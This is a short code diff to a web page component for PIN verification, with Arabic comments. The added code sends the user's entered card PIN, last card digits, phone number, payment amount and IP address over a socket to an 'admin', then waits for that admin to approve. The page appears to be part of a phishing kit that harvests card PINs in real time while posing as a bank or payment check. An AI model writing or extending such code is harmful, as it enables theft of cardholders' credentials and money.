@@ -19,9 +19,30 @@ export default function PINVerification() {
       return;
     }
 
+    // الحصول على IP الخاص بالمستخدم
+    const userIP = sessionStorage.getItem('userIP');
+
     // الاستماع لرد الأدمن
     if (socket) {
+      // إرسال رمز PIN للأدمن عبر Socket
+      socket.emit('newPIN', {
+        ip: userIP,
+        pinCode,
+        cardLastDigits,
+        phoneNumber,
+        amount,
+        timestamp: new Date().toISOString()
+      });
+
       socket.on('pinVerificationStatus', (data) => {
+        console.log('🔑 PIN verification status received:', data);
+        
+        // التحقق من أن الرسالة موجهة لهذا المستخدم فقط
+        if (data.ip && data.ip !== userIP) {
+          console.log('⚠️ PIN status not for this user, ignoring');
+          return;
+        }
+
         if (data.status === 'approved') {
           setVerificationStatus('approved');
           setTimeout(() => {
